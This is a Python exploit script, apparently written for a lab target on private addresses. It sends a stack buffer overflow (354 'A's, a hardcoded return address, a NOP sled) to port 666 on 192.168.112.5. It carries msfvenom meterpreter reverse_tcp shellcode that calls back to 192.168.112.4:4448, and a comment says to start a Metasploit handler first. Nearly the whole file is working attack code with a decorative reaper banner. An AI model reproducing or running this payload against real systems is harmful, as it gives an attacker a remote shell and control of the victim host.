#!/usr/bin/python
import socket
# coding=utf-8

reaper = ""
reaper +="               ...                                 \n"
reaper +="             ;::::;                                \n"
reaper +="           ;::::; :;                               \n"
reaper +="         ;:::::'   :;                              \n" 
reaper +="        ;:::::;     ;.                             \n"
reaper +="       ,:::::'       ;           OOO\              \n"
reaper +="       ::::::;       ;          OOOOO\             \n"
reaper +="       ;:::::;       ;         OOOOOOOO            \n"
reaper +="      ,;::::::;     ;'         / OOOOOOO           \n"
reaper +="    ;:::::::::`. ,,,;.        /  / DOOOOOO         \n"
reaper +="  .';:::::::::::::::::;,     /  /     DOOOO        \n"
reaper +=" ,::::::;::::::;;;;::::;,   /  /        DOOO       \n"
reaper +=";`::::::`'::::::;;;::::: ,#/  /          DOOO      \n"
reaper +=":`:::::::`;::::::;;::: ;::#  /            DOOO     \n"
reaper +="::`:::::::`;:::::::: ;::::# /              DOO     \n"
reaper +="`:`:::::::`;:::::: ;::::::#/               DOO     \n"
reaper +=" :::`:::::::`;; ;:::::::::##                OO     \n"
reaper +=" ::::`:::::::`;::::::::;:::#                OO     \n"
reaper +=" `:::::`::::::::::::;'`:;::#                O      \n"
reaper +="  `:::::`::::::::;' /  / `:#                       \n"
reaper +="   ::::::`:::::;'  /  /   `#                       \n"


#msfvenom LHOST=192.168.112.4 LPORT=4448 -p linux/x86/meterpreter/reverse_tcp -b '\x00' -f py

buf =  ""
buf += "\xbd\xc3\x62\x2c\x9a\xdd\xc2\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x1f\x83\xc6\x04\x31\x6e\x11\x03\x6e\x11\xe2"
buf += "\x36\x08\x26\xc4\x89\x16\xc1\x1b\xba\xeb\x7d\xb6\x3e"
buf += "\x5c\xe7\xcf\xdf\x51\x68\x58\x44\x02\xa9\xcf\x0a\xd6"
buf += "\x41\x12\xea\xc7\xf1\x9b\x0b\x8d\x97\xc3\x9b\x03\x0f"
buf += "\x7d\xfa\xe7\x62\xfd\x79\x27\x05\xe7\xcf\xdc\xcb\x7f"
buf += "\x6d\x1c\x34\x80\x29\x77\x34\xea\xcc\x0e\xd7\xdb\x07"
buf += "\xdd\x98\x99\x57\xa7\x25\x4a\x70\xea\x51\x34\x7e\x1a"
buf += "\x5e\x46\xf7\xf9\x9f\xad\x0b\x3f\xfc\x3e\xa3\xc2\xce"
buf += "\xbf\x46\xfc\xa9\xaf\x13\x74\xa8\x49\x15\x8a\x9b\x69"
buf += "\x94\x13\x5e\xad\x5e\x16\x9e\xcf\x26\x17\x60\x10\x56"
buf += "\xa3\x61\x10\x56\xd3\xac\x90"

# Send 354 'A' characters, the return address, 16 '\x90' characters or NOPS, and the msfvenom payload.. Make sure to run exploit/multi/handler prior to executing the script. 

ret = "\xa7\x8f\x04\x08" 
buffer = 'A' * 354 + ret + '\x90' * 16 + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
message = "[+] Sending evil buffer... >:)\n"
print ("\n\033[1;32;48m" + message)
print ("\033[1;31;48m" + reaper)

s.connect(('192.168.112.5',666))
s.send(buffer)
data = s.recv(1024)
s.close()
